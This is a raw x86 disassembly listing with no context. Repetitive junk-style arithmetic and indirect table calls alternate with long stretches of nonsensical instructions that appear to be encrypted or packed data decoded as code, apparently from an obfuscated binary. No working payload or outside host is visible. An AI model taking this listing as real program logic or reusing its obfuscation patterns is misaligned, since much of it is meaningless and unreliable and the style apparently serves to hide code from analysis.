  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x428143,0x3019
  420337:	not    DWORD PTR ds:0x4282cb
  42033d:	cmp    DWORD PTR ds:0x4282cb,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x42832b
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428e7c
  420363:	adc    ecx,DWORD PTR ds:0x428203
  420369:	xor    DWORD PTR ds:0x4282bf,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x4281db
  420377:	mov    esi,DWORD PTR ds:0x428293
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
  420382:	sbb    DWORD PTR ds:0x428147,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x4282bb,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x428337,0x0
  4203b4:	mov    DWORD PTR ds:0x42825f,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x42815b
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x42821f,0x2dc
  4203d5:	mov    DWORD PTR ds:0x42821b,edi
  4203db:	cmp    DWORD PTR ds:0x428337,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x427faf
  4203ed:	call   DWORD PTR ds:0x428e80
  4203f3:	movzx  esi,WORD PTR ds:0x428137
  4203fa:	add    DWORD PTR ds:0x4282b7,esi
  420400:	adc    DWORD PTR ds:0x428157,ebx
  420406:	add    DWORD PTR ds:0x428333,0x22a2
  420410:	and    esi,DWORD PTR ds:0x428333
  420416:	or     DWORD PTR ds:0x42832f,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x4282b3
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x428233,0x0
  42042e:	mov    DWORD PTR ds:0x428333,0x5615
  420438:	mov    DWORD PTR ds:0x42812b,0x419b
  420442:	mov    DWORD PTR ds:0x42814f,0x389d
  42044c:	not    DWORD PTR ds:0x428223
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x428233,0x0
  420463:	je     0x4204a0
  420469:	push   0x4281ff
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428e84
  420477:	sub    DWORD PTR ds:0x4282b7,0x6950
  420481:	movzx  esi,WORD PTR ds:0x42822b
  420488:	xor    esi,DWORD PTR ds:0x4282db
  42048e:	mov    DWORD PTR ds:0x42822b,esi
  420494:	mov    esi,DWORD PTR ds:0x428213
  42049a:	or     DWORD PTR ds:0x4282af,esi
  4204a0:	xor    DWORD PTR ds:0x4282df,ecx
  4204a6:	add    DWORD PTR ds:0x4282df,ebx
  4204ac:	or     DWORD PTR ds:0x428337,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x42814b,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x42812f,ebx
  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x428367,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x42814b,0x0
  420500:	mov    DWORD PTR ds:0x4282b3,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x42824f
  42051b:	cmp    DWORD PTR ds:0x42814b,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428e88
  420543:	mov    esi,DWORD PTR ds:0x42813b
  420549:	sbb    DWORD PTR ds:0x428157,esi
  42054f:	and    DWORD PTR ds:0x428253,edx
  420555:	sbb    DWORD PTR ds:0x428207,edx
  42055b:	mov    esi,DWORD PTR ds:0x42833f
  420561:	or     DWORD PTR ds:0x428343,esi
  420567:	mov    esi,DWORD PTR ds:0x428167
  42056d:	mov    edx,DWORD PTR ds:0x4282ff
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x42833f,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x428133,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x428357,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x4281f3,0x2222
  4205bd:	not    DWORD PTR ds:0x428203
  4205c3:	cmp    DWORD PTR ds:0x428133,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x42835f
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428e0c
  4205e8:	xor    edx,DWORD PTR ds:0x428207
  4205ee:	mov    ecx,DWORD PTR ds:0x4281ef
  4205f4:	or     DWORD PTR ds:0x42811f,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x428293
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x42835b,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x42823b
  42061a:	xor    DWORD PTR ds:0x428227,edx
  420620:	movzx  ecx,WORD PTR ds:0x428213
  420627:	and    ecx,DWORD PTR ds:0x42834b
  42062d:	mov    DWORD PTR ds:0x428213,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x42835f,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	popf   
  42066f:	push   0x1dacaae7
  420674:	push   ss
  420675:	sbb    BYTE PTR [ebx+0x71181812],ah
  42067b:	sbb    al,0x57
  42067d:	sub    DWORD PTR [ebx-0x4e],esp
  420680:	push   edi
  420681:	mov    edx,0x8fe520a8
  420686:	outs   dx,BYTE PTR ds:[esi]
  420687:	inc    esp
  420688:	mov    dh,0xd9
  42068a:	fsubr  DWORD PTR ds:0x22a14eee
  420690:	sbb    al,0x14
  420692:	dec    edi
  420693:	jne    0x42062f
  420695:	jg     0x420618
  420697:	mov    ebp,0x96ea51dd
  42069c:	inc    edi
  42069d:	arpl   WORD PTR [ebx],bx
  42069f:	push   esi
  4206a0:	sub    eax,0x99d24556
  4206a5:	sub    cl,BYTE PTR [eax-0x11f30174]
  4206ab:	add    BYTE PTR ds:0xa3aabffb,0xb1
  4206b2:	aam    0x22
  4206b4:	push   esi
  4206b5:	push   ecx
  4206b6:	lea    ebp,[eax-0x745e68b]
  4206bc:	sub    DWORD PTR [ebx+eax*1+0x15dfa967],esp
  4206c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206c4:	pop    esi
  4206c5:	xor    cl,bl
  4206c7:	sbb    DWORD PTR [edx],ebx
  4206c9:	xor    ebp,0x69395466
  4206cf:	dec    ecx
  4206d0:	xor    ecx,DWORD PTR [ecx]
  4206d2:	sub    edx,ebx
  4206d4:	sub    DWORD PTR [edx-0x40],edi
  4206d7:	sbb    bh,bh
  4206d9:	fadd   DWORD PTR [edi+0x24]
  4206dc:	fcomp  DWORD PTR [bx+si]
  4206df:	or     edi,DWORD PTR [edi-0x319b0a44]
  4206e5:	jae    0x420740
  4206e7:	dec    esp
  4206e8:	(bad)  
  4206e9:	icebp  
  4206ea:	push   es
  4206eb:	sub    eax,0xcd497884
  4206f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206f1:	mov    dh,0x13
  4206f3:	pop    ecx
  4206f4:	jne    0x420735
  4206f6:	xchg   ecx,eax
  4206f7:	cli    
  4206f8:	inc    edi
  4206f9:	sub    al,0x49
  4206fb:	adc    esp,ebp
  4206fd:	add    BYTE PTR [eax+0x42250d42],ch
  420703:	dec    ebx
  420704:	jo     0x4206fb
  420706:	pop    eax
  420707:	fidivr DWORD PTR [eax]
  420709:	xor    BYTE PTR ds:0x87d50ab1,ah
  42070f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420710:	retf   0x46ce
  420713:	and    DWORD PTR [edi-0x43],edi
  420716:	dec    edi
  420717:	xor    al,0x7c
  420719:	inc    ecx
  42071a:	test   eax,0x5544ef31
  42071f:	daa    
  420720:	or     bh,bh
  420722:	and    BYTE PTR [ebx+0x72ed265d],dl
  420728:	out    dx,eax
  420729:	mov    al,ds:0x8ce734ad
  42072e:	jns    0x4206b0
  420730:	add    ah,BYTE PTR [ebx-0x71]
  420733:	adc    ch,BYTE PTR [edi]
  420735:	adc    BYTE PTR [ecx-0x1d04a62],bh
  42073b:	(bad)  
  42073d:	xor    ah,ah
  42073f:	call   0xd3:0x3b312740
  420746:	mov    esp,0x5680d8ca
  42074b:	mov    edi,DWORD PTR [ebx]
  42074d:	int3   
  42074e:	push   es
  42074f:	in     al,dx
  420750:	outs   dx,DWORD PTR ds:[esi]
  420751:	es in  eax,0x3a
  420754:	aam    0x78
  420756:	in     eax,0x3c
  420758:	push   ds
  420759:	push   ebp
  42075a:	or     eax,0xeb3664aa
  42075f:	sbb    BYTE PTR [esi+0x73],ah
  420762:	cmp    ebp,esi
  420764:	jne    0x4207c1
  420766:	jnp    0x4206f6
  420768:	pop    esi
  420769:	jmp    0x42072c
  42076b:	je     0x42070a
  42076d:	mov    bh,0xb7
  420770:	mov    ds:0x6693dcd0,eax
  420775:	dec    eax
  420776:	mov    cl,al
  420778:	jne    0x420779
  42077a:	enter  0x4dce,0x65
  42077e:	in     eax,0x60
  420780:	inc    edi
  420781:	fisubr WORD PTR [ebx]
  420783:	jle    0x42078c
  420785:	dec    ecx
  420786:	addr16 jmp 0x4207b1
  420789:	arpl   WORD PTR ds:0x3acba382,cx
  42078f:	fiadd  WORD PTR [edi]
  420791:	fdiv   st,st(0)
  420793:	xor    eax,0xb935c19a
  420798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420799:	imul   ebx,edi,0xffffffa5
  42079c:	fisub  WORD PTR [ebx-0x7f594afb]
  4207a2:	or     eax,0xf6e5e9b6
  4207a7:	pop    eax
  4207a8:	daa    
  4207a9:	fiadd  WORD PTR [ebp+ecx*2-0xb]
  4207ad:	xchg   BYTE PTR ds:0x37018e68,ch
  4207b3:	retf   0x9f58
  4207b6:	push   ds
  4207b7:	push   ecx
  4207b8:	lods   al,BYTE PTR ds:[esi]
  4207b9:	mov    eax,DWORD PTR [edx]
  4207bb:	ja     0x420822
  4207bd:	sbb    al,BYTE PTR [ebx+edi*2+0x47]
  4207c1:	sub    al,0x37
  4207c3:	xor    eax,0x846b5d6e
  4207c8:	clc    
  4207c9:	cld    
  4207ca:	sbb    BYTE PTR [edi],dl
  4207cc:	push   ds
  4207cd:	push   ds
  4207ce:	mov    esp,0xf693f2f9
  4207d3:	cli    
  4207d4:	das    
  4207d5:	shl    BYTE PTR [ebp-0x5a],0x0
  4207d9:	fimul  WORD PTR [eax+0x5d8e12e]
  4207df:	adc    al,0x47
  4207e1:	or     DWORD PTR ds:0x72428fb4,ebx
  4207e7:	nop
  4207e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207e9:	cmp    bh,BYTE PTR [edx-0x5e]
  4207ec:	xchg   DWORD PTR [ecx-0x7fb8ea2f],edx
  4207f2:	test   al,0xfa
  4207f4:	push   ebx
  4207f5:	mov    ecx,0xfa39ee8b
  4207fa:	mov    esi,0x286fe993
  4207ff:	adc    eax,0x72a74354
  420804:	xchg   esp,eax
  420805:	ret    0x2d69
  420808:	cld    
  420809:	push   esp
  42080a:	std    
  42080b:	popa   
  42080c:	dec    ebp
  42080d:	lock int3 
  42080f:	or     al,0xca
  420811:	add    eax,0xa122e0eb
  420816:	mov    dl,0x9b
  420818:	cmc    
  420819:	mov    al,ds:0x37fcc286
  42081e:	into   
  42081f:	or     al,0x7d
  420821:	fst    DWORD PTR [eax]
  420823:	std    
  420824:	add    bl,BYTE PTR [edx]
  420826:	retf   0xbdc8
  420829:	push   ebp
  42082a:	jecxz  0x420823
  42082c:	int    0x39
  42082e:	cmp    eax,0xd4673486
  420833:	inc    ecx
  420834:	xor    al,0xdd
  420836:	jb     0x420837
  420838:	gs mov bl,0xde
  42083b:	out    dx,eax
  42083c:	mov    WORD PTR [ecx],ss
  42083e:	xchg   ebx,eax
  42083f:	nop
  420840:	dec    edi
  420841:	mov    ah,0x62
  420843:	or     eax,esi
  420845:	out    0x93,al
  420847:	push   esi
  420848:	fadd   DWORD PTR [esp+esi*8+0x27]
  42084c:	(bad)  
  42084d:	sub    eax,0x6f38f7fe
  420852:	loope  0x420813
  420854:	push   eax
  420855:	in     eax,0x20
  420857:	inc    edi
  420858:	clc    
  420859:	push   es
  42085a:	dec    esp
  42085b:	xor    eax,DWORD PTR [edx]
  42085d:	inc    esp
  42085e:	js     0x42084d
  420860:	mov    esp,0xfd5df394
  420865:	jmp    0x47ca:0xf3b6a06d
  42086c:	into   
  42086d:	jns    0x42089c
  42086f:	sbb    DWORD PTR [esi-0x1c],edi
  420872:	sub    esi,DWORD PTR [eax-0x2b]
  420875:	aas    
  420876:	test   eax,0xcad35c0e
  42087b:	jmp    0xbe78:0x69915275
  420882:	and    DWORD PTR [eax-0x5b5853c1],0x4
  420889:	jo     0x420863
  42088b:	cli    
  42088c:	shl    al,1
  42088e:	jmp    0xdc85a028
  420893:	mov    eax,0x92630ea1
  420898:	sub    eax,0x1408aed8
  42089d:	sub    eax,0x662d808d
  4208a2:	test   ah,ah
  4208a4:	mov    edi,0x4fb0c952
  4208a9:	xchg   edx,eax
  4208aa:	lea    eax,[eax+0x6f111aee]
  4208b0:	mov    ss,WORD PTR [ecx+0x38825235]
  4208b6:	dec    esi
  4208b7:	in     eax,dx
  4208b8:	inc    edx
  4208b9:	sahf   
  4208ba:	or     eax,0xcfa63244
  4208bf:	or     DWORD PTR [ecx+0x78],ecx
  4208c2:	test   DWORD PTR [edx],0x5f9aaba3
  4208c8:	sub    edi,0x483f4a0
  4208ce:	scas   al,BYTE PTR es:[edi]
  4208cf:	and    bl,0xf5
  4208d2:	push   ds
  4208d3:	dec    DWORD PTR [edi+edx*1-0xf]
  4208d7:	mov    esi,0xb9486689
  4208dc:	sub    BYTE PTR [eax+ebx*1+0x1d],dl
  4208e0:	loope  0x4208dd
  4208e2:	jmp    0x9092:0xa3f5c0f1
  4208e9:	ret    
  4208ea:	shr    BYTE PTR [esi-0x220e157e],0x7b
  4208f1:	cmp    al,0xa0
  4208f3:	sub    DWORD PTR [edx-0x30],esp
  4208f6:	pop    ds
  4208f7:	mov    ebp,0x95e87626
  4208fc:	(bad)  
  4208fd:	mov    edi,0x640ac966
  420902:	repnz test dh,ch
  420905:	xchg   ebp,eax
  420906:	dec    esi
  420907:	stos   BYTE PTR es:[edi],al
  420908:	call   0x5e1:0xa979e54a
  42090f:	adc    al,0x33
  420911:	shl    DWORD PTR [edi],1
  420913:	outs   dx,BYTE PTR ds:[esi]
  420914:	lods   eax,DWORD PTR ds:[esi]
  420915:	mov    ebx,0x40655ee8
  42091a:	enter  0x2bff,0x6f
  42091e:	scas   eax,DWORD PTR es:[edi]
  42091f:	int3   
  420920:	test   esp,edi
  420922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420923:	pop    ss
  420924:	lds    ebx,FWORD PTR [eax]
  420926:	int3   
  420927:	pop    es
  420928:	xor    al,0xfe
  42092a:	pop    edx
  42092b:	mov    edx,0x70beda60
  420930:	rcl    BYTE PTR [edx],0x84
  420933:	cmp    ch,BYTE PTR [eax+0xc2b47ea]
  420939:	dec    esi
  42093a:	out    dx,al
  42093b:	push   ebx
  42093c:	mov    esi,ds
  42093e:	popa   
  42093f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420940:	mov    ss,edx
  420942:	jmp    0x420940
  420944:	push   ecx
  420945:	sbb    eax,0xdc4dc82
  42094a:	fwait
  42094b:	xchg   edx,eax
  42094c:	clc    
  42094d:	ins    DWORD PTR es:[edi],dx
  42094e:	aas    
  42094f:	fist   DWORD PTR [esi]
  420951:	adc    eax,0x763972fa
  420956:	mov    dl,0x33
  420958:	mov    bh,0x5a
  42095a:	fsubrp st(2),st
  42095c:	scas   al,BYTE PTR es:[edi]
  42095d:	outs   dx,DWORD PTR ds:[esi]
  42095e:	popf   
  42095f:	fist   DWORD PTR [edi]
  420961:	adc    BYTE PTR [edi],bl
  420963:	lds    eax,FWORD PTR [edx]
  420965:	mov    ch,0x26
  420967:	and    BYTE PTR ds:0xc41dba8e,bh
  42096d:	popf   
  42096e:	mov    cl,0x87
  420970:	xor    DWORD PTR [esi],ebx
  420972:	ins    BYTE PTR es:[di],dx
  420974:	(bad)  
  420975:	into   
  420976:	jmp    0x79b67ba0
  42097b:	icebp  
  42097c:	std    
  42097d:	stos   BYTE PTR es:[edi],al
  42097e:	push   eax
  42097f:	mov    al,0xc1
  420981:	(bad)  
  420983:	hlt    
  420984:	repnz rcr ebx,0x4b
  420988:	sub    dl,dh
  42098a:	or     dh,BYTE PTR [edi+0x4]
  42098d:	in     al,dx
  42098e:	scas   eax,DWORD PTR es:[edi]
  42098f:	jb     0x420932
  420991:	retf   0x17a8
  420994:	scas   eax,DWORD PTR es:[edi]
  420995:	inc    edi
  420996:	enter  0xaef7,0x5f
  42099a:	mov    DWORD PTR [edi],esi
  42099c:	adc    BYTE PTR [ebp+0x7a1ec815],ah
  4209a2:	xor    bh,BYTE PTR [eax]
  4209a4:	dec    edi
  4209a5:	ds jno 0x420a13
  4209a8:	iret   
  4209a9:	pusha  
  4209aa:	push   cs
  4209ab:	sar    DWORD PTR [eax-0x7537dde9],1
  4209b1:	or     eax,0xdd668f05
  4209b6:	out    dx,eax
  4209b7:	adc    al,0xea
  4209b9:	mov    DWORD PTR [ebp-0x94],0x561c
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x428223
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x4282bf,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x4282e7,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x4281ff
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x42812b,0x6139
  420a0d:	mov    DWORD PTR ds:0x428363,0x3849
  420a17:	cmp    DWORD PTR ds:0x4282e7,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428e10
  420a34:	sub    DWORD PTR ds:0x4282bb,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x4281ef,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x42824b
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x4282bb
  420a66:	sub    DWORD PTR ds:0x4282cf,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x42812f
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x428243,0x0
  420a81:	mov    DWORD PTR ds:0x4282ab,ecx
  420a87:	mov    esi,DWORD PTR ds:0x4282e3
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x42822b,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x428243,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428e14
  420abd:	mov    esi,DWORD PTR ds:0x42832b
  420ac3:	or     DWORD PTR ds:0x428253,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x428163
  420ad1:	mov    esi,DWORD PTR ds:0x4283a7
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x42812b
  420ae2:	or     DWORD PTR ds:0x428253,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x4282b3,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0xa
  420b0e:	inc    ebp
  420b0f:	adc    al,0xaa
  420b11:	ss pop ss
  420b13:	push   ss
  420b14:	sbb    BYTE PTR [ebx-0x47e7e7ee],ah
  420b1a:	lods   eax,DWORD PTR ds:[esi]
  420b1b:	cli    
  420b1c:	sub    DWORD PTR [ebx],edx
  420b1e:	out    dx,eax
  420b1f:	inc    edi
  420b20:	push   ds
  420b21:	div    DWORD PTR [esi]
  420b23:	test   al,0x2b
  420b25:	in     al,dx
  420b26:	sbb    eax,0xac15442a
  420b2b:	mov    ebx,0x9a8b87b6
  420b30:	aaa    
  420b31:	ds push eax
  420b33:	sahf   
  420b34:	ja     0x420b5a
  420b36:	fdivr  st,st(7)
  420b38:	aam    0xe7
  420b3a:	or     BYTE PTR [esi-0x3d],0x5e
  420b3e:	pop    edx
  420b3f:	push   es
  420b40:	enter  0x93f9,0x82
  420b44:	xchg   edi,eax
  420b45:	jnp    0x420b73
  420b47:	mov    cl,BYTE PTR [edi+ebp*4]
  420b4a:	jae    0x420b64
  420b4c:	das    
  420b4d:	jae    0x420b4f
  420b4f:	call   0xa60:0x30300373
  420b56:	sbb    al,0xfa
  420b58:	xlat   BYTE PTR ds:[ebx]
  420b59:	scas   eax,DWORD PTR es:[edi]
  420b5a:	pop    eax
  420b5b:	jmp    0x420b9b
  420b5d:	outs   dx,BYTE PTR ds:[esi]
  420b5e:	mov    eax,0xb17cafc3
  420b63:	fwait
  420b64:	push   edi
  420b65:	adc    ebp,esi
  420b67:	jbe    0x420be8
  420b69:	or     al,0xc0
  420b6b:	repnz cwde 
  420b6d:	jns    0x420ba3
  420b6f:	mov    ch,0x2e
  420b71:	push   edx
  420b72:	(bad)  
  420b73:	neg    BYTE PTR [esi-0x15232d8b]
  420b79:	gs xor eax,0xef32026d
  420b7f:	fld    DWORD PTR [edi-0x563eca51]
  420b85:	stos   DWORD PTR es:[edi],eax
  420b86:	cmp    al,0xfd
  420b88:	sbb    al,0xfd
  420b8a:	add    BYTE PTR [ecx+eax*8],al
  420b8d:	sub    eax,0x56680536
  420b92:	inc    eax
  420b93:	fisub  DWORD PTR [edi-0x77d5e6b6]
  420b99:	mov    eax,ds:0xc5aa256c
  420b9e:	fwait
  420b9f:	cmp    ah,BYTE PTR [edx+0x11]
  420ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ba3:	out    0xa2,al
  420ba5:	adc    edi,DWORD PTR ss:[edx]
  420ba8:	imul   ebx,edx,0xb52a54a
  420bae:	push   edi
  420baf:	jbe    0x420b7e
  420bb1:	jg     0x420c31
  420bb3:	hlt    
  420bb4:	mov    ch,0x40
  420bb6:	test   BYTE PTR [ecx],0x11
  420bb9:	loope  0x420bf3
  420bbb:	popa   
  420bbc:	adc    eax,0x8cbc700f
  420bc1:	fidiv  DWORD PTR [edx+0x4b0d2cd1]
  420bc7:	mov    ss,WORD PTR [ebx]
  420bc9:	in     eax,0x63
  420bcb:	adc    DWORD PTR [eax+0x93e9c24],eax
  420bd1:	sub    DWORD PTR [ebx+0x4e8cef16],0xffffffc9
  420bd8:	sbb    DWORD PTR [esi-0x57],ebp
  420bdb:	mov    cl,0xf9
  420bdd:	loope  0x420be4
  420bdf:	xor    eax,0x2b2dd94b
  420be4:	or     eax,0x3048c5dc
  420be9:	mov    cl,0x2b
  420beb:	dec    ebp
  420bec:	ja     0x420bbc
  420bee:	inc    esp
  420bef:	mov    edi,0x89a211af
  420bf4:	adc    esi,esi
  420bf6:	push   ebx
  420bf7:	push   esp
  420bf8:	cmp    edx,esp
  420bfa:	mov    ebp,0x19581cae
  420bff:	shl    DWORD PTR [esi+eax*4],cl
  420c02:	call   0x33e8:0xb0f1a529
  420c09:	xchg   edx,eax
  420c0a:	add    BYTE PTR [ecx+0x240053b1],bl
  420c10:	scas   al,BYTE PTR es:[edi]
  420c11:	jno    0x420c5d
  420c13:	loope  0x420c73
  420c15:	mov    eax,ds:0xb43ef607
  420c1a:	fwait
  420c1b:	push   eax
  420c1c:	add    DWORD PTR [eax],ebx
  420c1e:	shl    BYTE PTR [ebp+0x178da73f],cl
  420c24:	aam    0x20
  420c26:	cmp    ebx,ebx
  420c28:	push   edi
  420c29:	outs   dx,BYTE PTR ds:[esi]
  420c2a:	mov    dx,0x6ed3
  420c2e:	cld    
  420c2f:	inc    ebx
  420c30:	in     eax,dx
  420c31:	pop    ebp
  420c32:	hlt    
  420c33:	nop
  420c34:	arpl   WORD PTR [edi-0x5b],si
  420c37:	rcr    DWORD PTR [ebp+0x5bb9f6e],cl
  420c3d:	(bad)  
  420c3e:	and    BYTE PTR [ecx+0x4de68302],ah
  420c44:	push   ss
  420c45:	push   edx
  420c46:	cld    
  420c47:	aaa    
  420c48:	dec    edx
  420c49:	pop    ebx
  420c4a:	mov    dh,0xe6
  420c4c:	adc    al,0xf9
  420c4e:	mov    eax,ds:0x290fa5be
  420c53:	mov    ebp,0x628a5a11
  420c58:	or     al,0xf8
  420c5a:	imul   eax,DWORD PTR [ecx-0x26],0x23
  420c5e:	sbb    al,0xf6
  420c60:	xor    BYTE PTR ds:0x1210c69c,ah
  420c66:	sbb    al,0xaf
  420c68:	popf   
  420c69:	inc    esi
  420c6a:	xchg   ebx,eax
  420c6b:	ds jmp 0xaf8b:0x531b9292
  420c73:	jns    0x420cd9
  420c75:	xchg   edi,eax
  420c76:	cmc    
  420c77:	cmp    al,0x6b
  420c79:	cmc    
  420c7a:	and    al,0xf
  420c7c:	sub    BYTE PTR [ecx+0x522918e2],cl
  420c82:	add    ecx,ecx
  420c84:	fild   DWORD PTR ds:0xa7a03796
  420c8a:	fdiv   DWORD PTR [eax]
  420c8c:	jge    0x420ca7
  420c8e:	and    esi,DWORD PTR [esi+edx*1]
  420c91:	test   DWORD PTR [edi-0x7b3b59f7],edi
  420c97:	pop    edx
  420c98:	mov    ?,eax
  420c9a:	ret    
  420c9b:	pop    eax
  420c9c:	pushf  
  420c9d:	or     ebx,0x6e
  420ca0:	jne    0x420cbf
  420ca2:	outs   dx,BYTE PTR ds:[esi]
  420ca3:	ret    0xa180
  420ca6:	call   0x893df258
  420cab:	gs inc ecx
  420cad:	mov    edx,0xf5588d34
  420cb2:	jl     0x420c4f
  420cb4:	jl     0x420c6d
  420cb6:	cli    
  420cb7:	jno    0x420cc1
  420cb9:	imul   DWORD PTR [edi+0x5b]
  420cbc:	pop    ebp
  420cbd:	xor    BYTE PTR [ecx+0x3c],dl
  420cc0:	push   edx
  420cc1:	inc    eax
  420cc2:	dec    ebx
  420cc3:	lock clc 
  420cc5:	nop
  420cc6:	in     eax,0xc9
  420cc8:	clc    
  420cc9:	mov    WORD PTR [ebp+ecx*2-0x19],?
  420ccd:	mov    esi,DWORD PTR [ecx+0x22855085]
  420cd3:	in     al,dx
  420cd4:	xchg   edx,eax
  420cd5:	fs adc eax,0xb57202bd
  420cdb:	into   
  420cdc:	(bad)
  420ce0:	mov    ds:0x3b95a68f,al
  420ce5:	retf   0x414d
  420ce8:	mov    esi,0x451cce28
  420ced:	std    
  420cee:	adc    edi,DWORD PTR [edi-0x3f]
  420cf1:	fistp  DWORD PTR [ecx+0x1f27a028]
  420cf7:	call   0xf90282b5
  420cfc:	inc    edx
  420cfd:	cld    
  420cfe:	add    al,0x81
  420d00:	inc    edi
  420d01:	xchg   esi,eax
  420d02:	loope  0x420d07
  420d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d05:	jne    0x420d57
  420d07:	in     al,dx
  420d08:	test   DWORD PTR [edi+0x1a35b9c],ebx
  420d0e:	test   BYTE PTR [eax],ah
  420d10:	push   0x53f4baae
